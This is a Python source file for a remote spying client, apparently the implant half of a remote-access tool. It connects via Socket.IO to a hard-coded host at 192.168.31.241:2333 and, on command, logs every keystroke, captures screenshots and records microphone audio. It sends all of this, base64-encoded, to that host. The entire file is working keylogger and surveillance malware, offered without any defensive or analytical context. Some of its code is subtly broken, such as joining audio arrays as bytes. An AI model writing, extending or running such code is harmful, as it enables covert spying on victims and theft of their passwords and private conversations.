
import socketio, threading, base64, io, time
from pynput import keyboard
from PIL import ImageGrab
import sounddevice as sd
import soundfile as sf

sio = socketio.Client()
recording = False
keylogging = False

@sio.event
def connect():
    print("Connected to server.")

@sio.event
def disconnect():
    print("Disconnected from server.")

def keylog_worker():
    def on_press(key):
        try:
            if keylogging:
                sio.emit('keylog_data', str(key.char))
        except AttributeError:
            sio.emit('keylog_data', str(key))
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

@sio.on('keylog_start')
def start_keylog():
    global keylogging
    keylogging = True

@sio.on('keylog_stop')
def stop_keylog():
    global keylogging
    keylogging = False

@sio.on('screenshot')
def take_screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    sio.emit('screenshot', base64.b64encode(buf.getvalue()).decode())

@sio.on('record_start')
def record_start():
    global recording
    recording = True
    threading.Thread(target=record_audio).start()

@sio.on('record_stop')
def record_stop():
    global recording
    recording = False

def record_audio():
    duration = 30
    samplerate = 44100
    recording_data = []
    def callback(indata, frames, time, status):
        if recording:
            recording_data.append(indata.copy())
        else:
            raise sd.CallbackStop()
    with sd.InputStream(samplerate=samplerate, channels=1, callback=callback):
        try:
            while recording:
                sd.sleep(100)
        except sd.CallbackStop:
            # Clean up socket connection and refresh if needed
            if sio.connected:
                sio.disconnect()
                time.sleep(1)
                try:
                    sio.connect('http://192.168.31.241:2333')
                except Exception as e:
                    print(f"Socket reconnect failed: {e}")
    buf = io.BytesIO()
    sf.write(buf, b''.join(recording_data), samplerate, format='WAV')
    sio.emit('audio', base64.b64encode(buf.getvalue()).decode())

if __name__ == '__main__':
    threading.Thread(target=keylog_worker, daemon=True).start()
    sio.connect('http://192.168.31.241:2333')
    sio.wait()
